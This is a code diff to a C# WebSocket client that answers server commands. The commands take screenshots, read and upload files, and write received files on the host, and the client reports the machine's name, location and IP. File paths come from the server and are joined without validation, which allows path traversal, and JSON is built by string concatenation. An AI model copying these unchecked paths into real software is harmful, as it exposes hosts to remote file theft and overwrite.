@@ -34,7 +34,7 @@ namespace ImageSender
 
         private Task OnError(WebSocketSharp.ErrorEventArgs arg)
         {
-            throw new NotImplementedException();
+            throw new NotImplementedException(); 
         }
 
         private static Task OnMessage(MessageEventArgs messageEventArgs)
@@ -42,12 +42,15 @@ namespace ImageSender
             string text = messageEventArgs.Text.ReadToEnd();
              result = JsonConvert.DeserializeObject<JToken>(text);
             if (result["type"].Value<String>() == "Connected") return Task.FromResult(0);
-
-
+            else if (result["type"].Value<String>() == "ping")
+            {
+                sendMessage("pong", "");
+                return Task.FromResult(0);
+            }
+            else if (result["type"].Value<String>() == "Disconnected") { return Task.FromResult(0); }
 
             if (result["type"].Value<String>() == "command") sendMessage("command_result", "radi");
-            else if (result["type"].Value<String>() == "Disconnected") { }
-            else if (result["type"].Value<String>() == "ping") sendMessage("pong", "");
+     
             else if (result["type"].Value<String>() == "getScreenshot") sendScreenshot();
             else if (result["type"].Value<String>() == "getFile") sendFile(result["path"].Value<String>(), result["fileName"].Value<String>());
             else if (result["type"].Value<String>() == "putFile") getFile(result["data"].Value<String>(), result["path"].Value<String>(), result["fileName"].Value<String>());
@@ -89,12 +92,12 @@ namespace ImageSender
         {
             comp = parser.ConfigParser();
   
-            ws.Send("{ \"type\":\"" + type + "\", \"message\":\"" + message + "\", \"name\":\"" + comp.name + "\", \"location\":\"" + comp.location + "\", \"ip\":\"" + comp.ip + "\", \"path\":\"" + comp.path + "\"}");
+            ws.Send("{ \"type\":\"" + type + "\", \"message\":\"" + message + "\", \"name\":\"" + comp.name + "\", \"location\":\"" + comp.location + "\", \"ip\":\"" + comp.ip + "\", \"path\":\"" + comp.fileLocations.File1 + "\"}");
         }
 
         private static void sendFile (String path,String fileName)
         {
-            String abspath = comp.path + "\\" + path+ "\\" + fileName;
+            String abspath = comp.fileLocations.File1 + "\\" + path + fileName;
             byte[] bytes = System.IO.File.ReadAllBytes(abspath);
             string base64String = Convert.ToBase64String(bytes);
             
@@ -103,7 +106,7 @@ namespace ImageSender
 
      private static void getFile(String base64String, String path, String fileName)
         {
-            String abspath = comp.path + "\\" + path + "\\" + fileName;
+            String abspath = comp.fileLocations.File1 + "\\" + path +  fileName;
             byte[] bytes = Convert.FromBase64String(base64String);
             File.WriteAllBytes(abspath, bytes);
 
